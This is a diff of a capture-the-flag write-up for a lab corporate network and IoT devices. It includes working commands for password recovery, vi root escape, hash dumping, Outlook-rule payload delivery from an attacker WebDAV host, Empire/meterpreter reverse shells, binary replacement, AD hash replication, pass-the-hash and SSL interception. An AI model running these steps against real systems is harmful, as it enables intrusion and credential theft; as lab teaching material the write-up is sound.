@@ -17,7 +17,7 @@ Usually, the corporate challenges give you a domain name and put you inside the 
 
 For the first challenge, we get a clue from the name of the challenge and realise that we have to do some DNS enumeration to get SRV records.
 
-```bash
+```c {hl_lines=[1]}
 $ nslookup -type=soa tictoc.cysca
 Server:		192.168.5.53
 Address:	192.168.5.53#53
@@ -40,7 +40,7 @@ Getting the Start of Authority information from the DNS server, we find out that
 
 We can then use dig AXFR to do a DNS zone transfer and get all the information from the DNS server:
 
-```bash
+```c {hl_lines=[1,19,22]}
 $ host -t axfr tictoc.cysca 172.16.5.53
 Trying "tictoc.cysca"
 Using domain server:
@@ -78,7 +78,7 @@ Using AXFR, we get the AXFR flag in a SRV record
 
 In this challenge, we are asked to look first at the FTP server (shown at ftp.tictoc.cysca in the DNS records). So let's use an anonymous connection to the FTP server:
 
-```bash
+```c {hl_lines=[1,22,24]}
 $ ftp 172.16.5.103
 Connected to 172.16.5.103.
 220-###############################################################################
@@ -117,7 +117,7 @@ drwxrwxr--    2 ftp      ftp          4096 Mar 06 17:03 tmp
 
 Looking around on the FTP server, we find some interesting files, and download them onto our attacker machine:
 
-```bash
+```c {hl_lines=[1,3,15,17,26]}
 ftp> cd Software
 250 Directory successfully changed.
 ftp> ls
@@ -155,7 +155,7 @@ Note that WinSCP is a software used for securely copying files to and from file 
 
 Looking inside this file, we do see what looks like an obfuscated password:
 
-```bash
+```c {hl_lines=[1]}
 $ cat WinSCP.ini | grep -i password=
 QueueRememberPassword=1
 PuttyPassword=0
@@ -166,7 +166,7 @@ Password=A35C775F17BBDA313F283D2E3B39283A282C7228353F28333F723F252F3F3D0F6C0F282
 As WinSCP stores this password in a retrievable format, people have already made tools to decode these obfuscated values back to the original password. One such tool is [winscppwd](https://bitbucket.org/knarf/winscppwd), which is described as "a simple commmand line tool to recover WinSCP stored passwords". We can run this tool in linux using Wine.
 
 Using this tool, we recover the password:
-```bash
+```c {hl_lines=[1]}
 $ wine winscppwd.exe WinSCP.ini 
 Could not load wine-gecko. HTML rendering will be disabled.
 Could not load wine-gecko. HTML rendering will be disabled.
@@ -178,7 +178,7 @@ mctarget@ftp.tictoc.cysca	S0Str0ng!N0tFl@gTh0
 Great! Looks like we got a password we can use for authenticating to the file server!
 
 Using the username and password we now have, we SSH into the file server:
-```bash
+```c {hl_lines=[1,2]}
 $ ssh mctarget@172.16.5.103
 mctarget@ftp:~$ uname -a
 Linux ftp 3.16.0-4-amd64 #1 SMP Debian 3.16.39-1+deb8u2 (2017-03-07) x86_64 GNU/Linux
@@ -186,8 +186,8 @@ Linux ftp 3.16.0-4-amd64 #1 SMP Debian 3.16.39-1+deb8u2 (2017-03-07) x86_64 GNU/
 
 Our next step is to try and get root on this machine, so we enumerate it using common commands for finding privilege escalation vectors e.g. from [g0tmi1k's blog](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/). After some enumeration, we find some interesting output from ```sudo -l```:
 
-```bash
-mctarget@ftp:/var/ftproot$ sudo -l
+```c {hl_lines=[1]}
+mctarget@ftp$ sudo -l
 Matching Defaults entries for mctarget on ftp:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
 
@@ -203,7 +203,7 @@ Specifically, looks like our user, mctarget, is able to execute ```vi``` as root
 
 Let's just use the simplest method, open a random file within ```/var/ftproot```, and then use ```:sh``` to escape ```vi```:
 
-```bash
+```c {hl_lines=[1,3,5,6]}
 mctarget@ftp:/var/ftproot$ sudo /usr/bin/vi /var/ftproot/testfile
 :sh
 root@ftp:/var/ftproot# id
@@ -223,7 +223,7 @@ We find an Outlook WebApp server running on the mail server at: https://172.16.5
 
 To get credentials for this server, we first look to confirm that an SMB connection is already established on the server:
 
-```bash
+```c {hl_lines=[1]}
 root@ftp:/home/mctarget# netstat -antup | grep smbd
 tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN      729/smbd        
 tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN      729/smbd        
@@ -236,7 +236,7 @@ We can see that a connection is established to 172.16.5.103!
 
 Next, to dump SAMBA hashes locally on the FTP machine, we can use a tool called pdbedit as follows:
 
-```bash
+```c {hl_lines=[1]}
 root@ftp:/home/mctarget# pdbedit -L -w
 mctarget:1002:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX:74D9349DA6D684E0D9ADC303DB64B9EA:[DU         ]:LCT-58AECC49:
 madisonw:1003:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX:2B2AC2D1C7C8FDA6CEA80B5FAD7563AA:[U          ]:LCT-58D74D46:
@@ -257,7 +257,7 @@ Googling a bit on using outlook client access to gain a shell, we come across a 
 So, to summarise, we can use create a malicious outlook rule for the user to execute code / start an application on the user's machine. The attack involves starting a WebDAV server on our attacker machine to serve an executable or script, and a reverse shell listener. We use ruler to create a malicious outlook rule to fetch our reverse shell executable / script from our WebDAV server and then send an email to the user to trigger the rule.
 
 So let's start Powershell Empire, set up a listener and create a batch script reverse shell:
-```bash
+```c {hl_lines=[1,2,4,5,6,8,9,10]}
 root@kali:~/Empire# ./empire
 (Empire) > listeners
 [!] No listeners currently active 
@@ -273,33 +273,33 @@ powershell.exe -NoP -sta -NonI -W Hidden -Enc WwBTAFkAUwBUAGUATQAuAE4ARQB0AC4AUw
 
 We create a ```shell.bat``` file and include the contents above into it, and place it in the folder ```/root/Documents/CySCA/corporate/webdav-serve```. Next, we can use golang with the ```webdavserv.go``` script provided by the creators of the ruler tool to start a WebDAV server as follows:
 
-```bash
+```c
 $ go run webdavserv.go -d /root/Documents/CySCA/corporate/webdav-serve
 ```
 
 Next, we can use the following code to display the current outlook rules of the user madisonw:
 
-```bash
-$ ./ruler-linux64 --insecure --url https://autodiscover.tictoc.cysca/autodiscover/autodiscover.xml --username madisonw --password computer --email madison.wilton@tictoc.cysca display
+```c
+$ ./ruler-linux64 --insecure --url "https://autodiscover.tictoc.cysca/autodiscover/autodiscover.xml" --username madisonw --password computer --email madison.wilton@tictoc.cysca display
 ```
 
 Note that we guessed the autodiscover URL based upon examples provided on Ruler's github page. From this command, we see that there are currently no outlook rules for madisonw. Next, we can use the following command to create a malicious outlook rule:
 
-```bash
-$ ./ruler-linux64 --insecure --url https://autodiscover.tictoc.cysca/autodiscover/autodiscover.xml --email madison.wilton@tictoc.cysca --username madisonw add --location "\\\\192.168.5.100\\webdav\\shell.bat" --trigger "pop a bat shell" --name maliciousrule
+```c
+$ ./ruler-linux64 --insecure --url "https://autodiscover.tictoc.cysca/autodiscover/autodiscover.xml" --email madison.wilton@tictoc.cysca --username madisonw add --location "\\\\192.168.5.100\\webdav\\shell.bat" --trigger "pop a bat shell" --name maliciousrule
 ```
 
 In the above line, we add an outlook rule which, when triggered, will download shell.bat from our WebDAV server and execute it. We named our rule ```maliciousrule``` and it will be triggered when madisonw receives an email with the subject of ```pop a bat shell```.
 
 Now, we send an email to madison.wilton@tictoc.cysca from the OWA portal we are logged in to, with the subject of "pop a bat shell", and we receive an reverse connection:
 
-```bash
+```c
 (Empire: stager/launcher) > [+] Initial agent SDE3VALZ2GNZBZMT from 10.10.5.100 now active
 ```
 
 Great! We confirm our reverse shell as follows:
 
-```bash
+```c {hl_lines=[1,9,10]}
 (Empire: stager/launcher) > agents
 
 [*] Active agents:
@@ -315,7 +315,7 @@ TICTOC\madisonw
 
 We fetch the flag from madison's Desktop as follows:
 
-```bash
+```c {hl_lines=[1,3,10]}
 (Empire: SDE3VALZ2GNZBZMT) > pwd
 C:\Users\madisonw\Desktop
 (Empire: SDE3VALZ2GNZBZMT) > ls
@@ -337,7 +337,7 @@ This challenge asks us to get root on madisonw's machine.
 
 We enumerate the machine looking for ways to escalate our privileges to Administrator. We could use scripts like PowerUp or JAWS to find vectors, however looking at some files on the filesystem showed us clues. Specifically, there was an AutoBackup folder in the root C:/ drive folder. This hints towards a backup script running automatically in the background, possibly in a scheduled task. Looking through the scheduled tasks on the machine, we find one interesting one:
 
-```bash
+```c {hl_lines=[1]}
 (Empire: SDE3VALZ2GNZBZMT) > shell schtasks /Query /tn "Run Backup Madison" /V /fo LIST
 Folder: \
 HostName:                             WORKSTATION
@@ -359,7 +359,7 @@ Run As User:                          madisonw
 
 This scheduled task seems to execute a powershell script called ```RunBackup.ps1``` in the AutoBackup folder, but it runs as the madisonw user. Let's have a look at this powershell script:
 
-```bash
+```powershell {hl_lines=[1]}
 (Empire: SDE3VALZ2GNZBZMT) > cat RunBackup.ps1
 <-----snip----->
 #kill previous if running
@@ -387,7 +387,7 @@ I cut off a majority of the script, and showed the main components. Specifically
 
 Let's have a look at the backup logs:
 
-```bash
+```c {hl_lines=[1]}
 (Empire: SDE3VALZ2GNZBZMT) > shell Get-Content backup.log | Select-Object -Last 10
 Backup Successful for markmctarget at 16/04/2017 2:41 PM
 
@@ -402,7 +402,7 @@ Backup Successful for markmctarget at 16/04/2017 2:43 PM
 
 Interestingly, we see that the backup script is actually being run by markmctarget! If we can somehow get our own code executed by this script, we can gain execution as markmctarget. So, let's use the ```cacls``` command to see if we can edit the files in question. We have a look at the PS1 script but unfortunately find that it's not editable by our user. We then look at ```Backup.exe``` and see the following:
 
-```bash
+```c {hl_lines=[1]}
 (Empire: SDE3VALZ2GNZBZMT) > shell cacls Backup.exe
 C:\AutoBackup\Backup.exe NT AUTHORITY\Authenticated Users:(ID)C 
                          NT AUTHORITY\SYSTEM:(ID)F 
@@ -416,7 +416,7 @@ Great! So we can change the executable to our own executable. However, we still 
 
 First, we can create our own malicious executable as follows:
 
-```bash
+```c {hl_lines=[1]}
 $ cat Dev-backup.c
 #include &lt;stdio.h>
 #include &lt;stdlib.h>
@@ -433,7 +433,7 @@ In the above, we create a C script which will execute a batch script. We will ev
 Googling for a way to change the file so that the CRC32 matches to a value of our choosing, we find the following article: https://www.nayuki.io/page/forcing-a-files-crc-to-any-value
 This article mentions a python script named ```forcecrc32.py``` which takes in the CRC32 value you want to match and the byteoffset of 4 characters you are happy to change in your file. We run this python script as follows:
 
-```bash
+```c {hl_lines=[1]}
 $ python forcecrc32.py Backup.exe 2434 CA1114C9
 Original CRC-32: 400B89A6
 Computed and wrote patch
@@ -442,7 +442,7 @@ New CRC-32 successfully verified
 
 Note that we picked a byteoffset of 2434 as the byte values at this location in the executable seemed like they did not affect the actual functionality of the executable. The original bytes of the executable were as follows:
 
-```bash
+```c {hl_lines=[1]}
 $ xxd -s 2434 Backup.exe | head
 00000982: aaaa aaaa c704 2424 4040 00e8 1a11 0000  ......$$@@......
 00000992: b800 0000 00c9 c390 9090 6690 6690 5383  ..........f.f.S.
@@ -458,7 +458,7 @@ $ xxd -s 2434 Backup.exe | head
 
 Anyway, now that we have our new ```Backup.exe``` that matches the correct CRC32 value, we can upload it to the server and replace the executable in the AutoBackup folder. Remember to also upload our shell.bat powershell empire script also.
 
-```bash
+```c
 (Empire: SDE3VALZ2GNZBZMT) > pwd
 C:\Users\madisonw\Documents
 (Empire: SDE3VALZ2GNZBZMT) > upload /root/Documents/CySCA/corporate/webdav-serve/webdav/shell.bat
@@ -469,7 +469,7 @@ C:\Users\madisonw\Documents
 
 After a minute or so, we can see above that we receive another reverse shell! This time, we can see that it is a shell with Administrative privileges (as denoted by the asterisk in Powershell Empire):
 
-```bash
+```c
 (Empire: SDE3VALZ2GNZBZMT) > agents
 
 [*] Active agents:
@@ -482,7 +482,7 @@ After a minute or so, we can see above that we receive another reverse shell! Th
 
 Now we can interact with this new agent, escalate our privileges to SYSTEM (as we have administrative privileges) and get the flag:
 
-```bash
+```c
 (Empire: agents) > interact 3ZMXB13RAYTAAPMS
 (Empire: 3ZMXB13RAYTAAPMS) > usemodule privesc/getsystem
 (Empire: privesc/getsystem) > execute
@@ -513,7 +513,7 @@ Currently, we have compromised markmctarget / madisonw's computer, but it is not
 
 First, let's have a look around the box and enumerate a bit more. Powershell Empire provides modules for collection of data post exploitation. One such module is to collect browser data:
 
-```bash
+```c
 (Empire: collection/browser_data) > usemodule collection/browser_data
 (Empire: collection/browser_data) > execute
 Job started: Debug32_2ktyr
@@ -536,7 +536,7 @@ From the results of this collection module, we can see that markmctarget visited
 
 We get the IP address of as ```backup.tictoc.cysca``` follows:
 
-```bash
+```c
 (Empire: 3ZMXB13RAYTAAPMS) > shell nslookup backup.tictoc.cysca
 Server:  dc.tictoc.cysca
 Address:  10.10.5.10
@@ -549,7 +549,7 @@ Now, let's try to get on RDP on our compromised workstation and access the backu
 
 The way I thought of doing this was to use meterpreter's ```portfwd``` feature to forward the RDP port to my local attacker machine. So first, let's start a meterpreter listener:
 
-```bash
+```c
 msf exploit(handler) > set payload windows/meterpreter/reverse_https
 msf exploit(handler) > set LHOST 192.168.5.101
 msf exploit(handler) > set LPORT 8081
@@ -561,7 +561,7 @@ msf exploit(handler) > exploit
 
 And then we can invoke shellcode and connect to this listener from our Empire agent as follows:
 
-```bash
+```c
 (Empire: collection/browser_data) > usemodule code_execution/invoke_shellcode
 (Empire: code_execution/invoke_shellcode) > set Lport 8081
 (Empire: code_execution/invoke_shellcode) > set Lhost 192.168.5.101
@@ -570,7 +570,7 @@ And then we can invoke shellcode and connect to this listener from our Empire ag
 
 We then receive our meterpreter reverse shell:
 
-```bash
+```c
 [*] Meterpreter session 1 opened (192.168.5.101:8081 -> 10.10.5.100:53770) at 2017-04-18 22:00:52 +1000
 
 meterpreter > getuid
@@ -579,7 +579,7 @@ Server username: TICTOC\markmctarget
 
 Finally, we can setup a port forward to be able to access RDP directly from our attacker machine:
 
-```bash
+```c
 meterpreter > portfwd add -l 3389 -p 3389 -r 127.0.0.1
 ```
 
@@ -587,7 +587,7 @@ Now we use ```rdesktop 127.0.0.1``` and the credentials ```TICTOC\madisonw:compu
 
 Researching online, we find a tool called [LaZagne](https://github.com/AlessandroZ/LaZagne) which "is an open source application used to retrieve lots of passwords stored on a local computer" including credentials from browsers. Let's go to the Releases page on this github, and get the ```laZagne.exe``` file. We then upload it to markmctarget's workstation and execute it from Powershell Empire:
 
-```bash
+```c
 (Empire: actuallyMark32) > shell C:\Users\markmctarget\Documents\laZagne.exe browsers -f
 |====================================================================|
 |                                                                    |
@@ -613,13 +613,13 @@ To generate the TokenCode for the website we want to login to, we actually have 
 
 Once logged in to the backup website, we are introduced to a website which allows us to upload a SSH public key to the ```authorized_keys``` file for markmctarget. Let's play around with this website by port forwarding port 80 on the web server to our local attacker machine:
 
-```bash
+```c
 meterpreter > portfwd add -l 8082 -p 80 -r 10.10.5.104
 ```
 
 Playing around with the web requests, we figure out that a cookie value is used to determine which folder the server looks into to add to the ```authorized_keys``` file. We can change the cookie value to change the folder in which the ```authorized_keys``` file is added to. So, as long as the web server has permissions to write to this file, we can add our SSH key to root's ```authorised_keys``` file!
 
-```css
+```http
 POST / HTTP/1.1
 Host: 127.0.0.1:8082
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
@@ -638,11 +638,11 @@ Having changed the linuxuser variable to ```../root```, our SSH public key gets 
 
 First, we port forward the SSH port on the backup server so that we can access it from our kali machine, and then we SSH using the private key that pairs with the public key we added above:
 
-```bash
+```c
 meterpreter > portfwd add -l 2222 -p 22 -r 10.10.5.104
 ```
 
-```bash
+```c {hl_lines=[1,4,6,8]}
 root@kali:~# ssh root@127.0.0.1 -p 2222
 Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law.
 Last login: Tue Apr 11 11:49:14 2017
@@ -661,7 +661,7 @@ In this challenge, we are asked to compromise the DC server in the tictoc.cysca 
 
 Looking around the backup server, we find a very interesting readme file in the ```/BACKUPS``` folder:
 
-```bash
+```c {hl_lines=[1]}
 root@BackupServer:/BACKUPS# cat readme 
 This folder contains the core file backups from the Domain Controllers.
 This was setup in the event migration to a new Windows Server version Failed.
@@ -669,7 +669,7 @@ This was setup in the event migration to a new Windows Server version Failed.
 
 It looks like there are core Windows files stored in this Backups folder! We can use the following commands to copy the DC and BackupDC's SAM, SECURITY and SYSTEM files to our local kali machine:
 
-```bash
+```c
 $ scp -P 2222 root@127.0.0.1:/BACKUPS/DC/SAM . 
 $ scp -P 2222 root@127.0.0.1:/BACKUPS/DC/SECURITY .
 $ scp -P 2222 root@127.0.0.1:/BACKUPS/DC/SYSTEM . 
@@ -680,7 +680,7 @@ $ scp -P 2222 root@127.0.0.1:/BACKUPS/BackupDC/SYSTEM .
 
 With these files, there are many tools to extract credentials including passwords and hashes from them. My favourite is Impacket's ```secretsdump.py``` which can be used as follows:
 
-```bash
+```c {hl_lines=[1]}
 root@kali:~/Documents/CySCA/corporate/70schocolate/BackupDC# secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
 Impacket v0.9.16-dev - Copyright 2002-2017 Core Security Technologies
 
@@ -698,7 +698,7 @@ We could try PTH or cracking the local SAM hashes, however the machine account c
 
 The blog post [here](https://room362.com/post/2015/using-domain-controller-account-passwords-to-hashdump-domains/) talks about how we can use the machine account credentials to replicate AD. Amazingly, the same tool we used before can be used for this, ```secretsdump.py```. However, we will need access to the SMB ports, 135 and 445, so that we can talk to the DC from our kali machine:
 
-```bash
+```c {hl_lines=[1,3]}
 meterpreter > portfwd add -l 135 -p 135 -r 10.10.5.10
 [*] Local TCP relay created: :135 <-> 10.10.5.10:135
 meterpreter > portfwd add -l 445 -p 445 -r 10.10.5.10
@@ -707,7 +707,7 @@ meterpreter > portfwd add -l 445 -p 445 -r 10.10.5.10
 
 Next, we use ```secretsdump.py``` to replicate AD and download the hashes stored in it:
 
-```bash
+```c {hl_lines=[1]}
 root@kali:~/Documents/CySCA/corporate/70schocolate/BackupDC# secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:0afd89a7c973d77553ff5b182db22554 -just-dc-ntlm TICTOC/BackupDC\$@127.0.0.1
 Impacket v0.9.16-dev - Copyright 2002-2017 Core Security Technologies
 
@@ -722,7 +722,7 @@ I have cut out most of the output of this command as there were many, many more 
 
 As we still have our PowerShell Empire listener running, we can simply use metasploit's psexec_psh module to execute our Empire reverse shell payload:
 
-```bash
+```c
 msf exploit(handler) > use exploit/windows/smb/psexec_psh
 msf exploit(psexec_psh) > set SMBPASS aad3b435b51404eeaad3b435b51404ee:0bcbdad17128326964ff65849559b685
 msf exploit(psexec_psh) > set SMBUSER Administrator
@@ -735,7 +735,7 @@ msf exploit(psexec_psh) > exploit
 
 And we receive a shell on PowerShell Empire! It should be noted however that for some reason we receive a shell as SYSTEM rather than as Administrator:
 
-```bash
+```c
 (Empire: stager/launcher) > [+] Initial agent LTZHYN1FSPDX2FCL from 10.10.5.10 now active
 (Empire: stager/launcher) > agents
 
@@ -748,14 +748,14 @@ And we receive a shell on PowerShell Empire! It should be noted however that for
 
 As the flag for this challenge is only readable by Administrator, and not SYSTEM (the irony...), we have to impersonate the Administrator's token to read the flag. The way I did this was to first gain a meterpreter shell again, and then impersonate Administrator's token using a build in meterpreter command:
 
-```bash
+```c
 (Empire: code_execution/invoke_metasploitpayload) > usemodule code_execution/invoke_shellcode
 (Empire: code_execution/invoke_shellcode) > set Lport 8081
 (Empire: code_execution/invoke_shellcode) > set Lhost 192.168.5.100
 (Empire: code_execution/invoke_shellcode) > execute
 ```
 
-```bash
+```c {hl_lines=[1,8,10,12,31,34]}
 msf exploit(handler) > exploit
 
 [*] Started HTTPS reverse handler on https://192.168.5.100:8081
@@ -817,7 +817,7 @@ We connect the Wi-Fi usb adapter to the kali VM and set it up as hotspot (see [t
 
 The first challenge was to dump the firmware from the device itself. This is quite simply with a tool called ```esptool.py```. We connect the IoT device via USB to our kali VM and dump the firmware as follows:
 
-```bash
+```c
 root@kali:~/Documents/CySCA# esptool.py --port /dev/ttyUSB0 read_flash 0 0x9a000 read_flash_output_0x9a000.bin
 ```
 
@@ -829,14 +829,15 @@ As we have the device connected to our Wi-fi hotspot, we can monitor the traffic
 
 Using Wireshark, we notice the following request coming from the IoT device:
 
-```css
+```http
 POST /data HTTP/1.0
 Host: tempsensor.cysca
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 227
 
 signature=FF43530EBEE483CE41A60B49E8B94D5EF9ABE854&data=%7B%22HUMIDITY%22%3A+%2248.7%22%2C+%22TEMPERATURE%22%3A+%2222.9%22%2C+%22MAC%22%3A+%22A0%3A20%3AA6%3A14%3A30%3A35%22%2C+%22TIMESTAMP%22%3A+%222017-04-12+12%3A12%3A33%22%7D
-
+```
+```http
 POST /data HTTP/1.0
 Host: tempsensor.cysca
 Content-Type: application/x-www-form-urlencoded
@@ -860,7 +861,7 @@ First, we look at the door lock. Once re-flashed with the door unlocker firmware
 
 In the ```binwalk``` output, I found a ```.cer``` file, a ```.key``` file, and the following python script:
 
-```bash
+```py {hl_lines=[1]}
 $ cat mqttpasswd.py
 import uhashlib
 import ubinascii
@@ -878,7 +879,7 @@ def genpw(mac,username):
 
 Additionally, we found a ```Main.py``` file with the following two interesting lines inside:
 
-```bash
+```py
 self.passwd = mqttpasswd.genpw(self.mac,self.username)
 self.client = MQTTClient(self.mac, self.server, self.port, self.mac, self.passwd, 0, ssl=True)
 ```
@@ -893,21 +894,21 @@ Our task was to intercept the SSL traffic sent from the device so that we can se
 
 Let's try the last option. We flush the iptables rules we currently have, and then use a PREROUTING rule to forward all traffic destined for the doorctrl web server to our local IP address on the wi-fi network:
 
-```bash
+```c
 $ iptables -t nat -F
 $ iptables -t nat -A PREROUTING -d 10.13.37.150 -p tcp --dport 8883 -j DNAT --to-destination 192.168.5.100
 ```
 
 Additionally, to intercept SSL traffic, we need to first create our own self-signed certificate with a private key so that we can present it to the IoT device and pretend to be the real server. We create these files as follows:
 
-```bash
+```c
 $ openssl genrsa -out ca.key 4096
 $ openssl req -new -x509 -days 1826 -key ca.key -out ca.crt
 ```
 
 Now we can use sslsplit with the generated certificate and private above to man-in-the-middle traffic between the IoT device and the web server:
 
-```bash
+```c
 $ sslsplit -D -l connections.log -j /root/Documents/CySCA/sslsplit/ -S logdir/ -k ca.key -c ca.crt ssl 192.168.5.100 8883 10.13.37.150 8883
 ```
 
